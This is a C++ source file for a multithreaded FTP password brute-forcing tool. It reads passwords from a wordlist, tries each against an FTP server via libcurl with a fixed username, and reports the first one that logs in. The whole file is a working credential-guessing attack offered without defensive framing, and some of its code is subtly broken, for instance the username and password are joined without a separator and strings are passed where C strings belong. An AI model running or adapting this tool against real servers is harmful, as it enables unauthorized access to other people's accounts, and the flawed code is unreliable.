
#include "./include/FUZZ.hpp"


FUZZ::FUZZ(std::string name, std::string IP, std::string user) 
    : nameFile(name), file(nameFile), IP(IP), user(user)
{
    if (!file.is_open())
    {
        std::cout << "can't open file " << std::endl;
        exit(1);
    }
}

void FUZZ::creatThread()
{
    std::vector<std::thread> threadPool;
    for (int i = 0; i < 10; i++)
    {
        threadPool.emplace_back(&FUZZ::Broot, this);
    }
    for (auto &t : threadPool)
    {
        t.join();
    } 
}

int FUZZ::cheack(std::string pass)
{
    std::string curlFtp = "ftp://ftp." + IP + ".com/";

    try {
        CURL *curl = curl_easy_init();
        if (!curl)
            throw std::runtime_error("Error in init curl");
        curl_easy_setopt(curl, CURLOPT_URL, curlFtp);
        curl_easy_setopt(curl, CURLOPT_USERPWD, user + pass);
        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            // if(res == CURLE_REMOTE_ACCESS_DENIED)
            //     throw std::runtime_error("Login failed: wrong username or password!\n");
            // else
            //     throw std::runtime_error("Curl error: " << curl_easy_strerror(res) << std::endl;
        } else {
            std::lock_guard<std::mutex> lock(lock_print);
            std::cout << "FTP operation succeeded. [" << pass << "]" << std::endl;
            exit(1);
        }
    } 
    catch (std::exception &e) {
        std::cerr << "FTP error: " << e.what() << std::endl;
        exit(1);
    }
    return 1;
}

void    FUZZ::Broot()
{
    while (true)
    {
        std::string line;
        {
            std::lock_guard<std::mutex> lock(lock_file);
            if (!getline(file, line))
                return;
        }
        {
            // std::lock_guard<std::mutex> lock(lock_print);
            cheack(line);
            // std::cout << "line is : " << line << std::endl;
        }
    }
}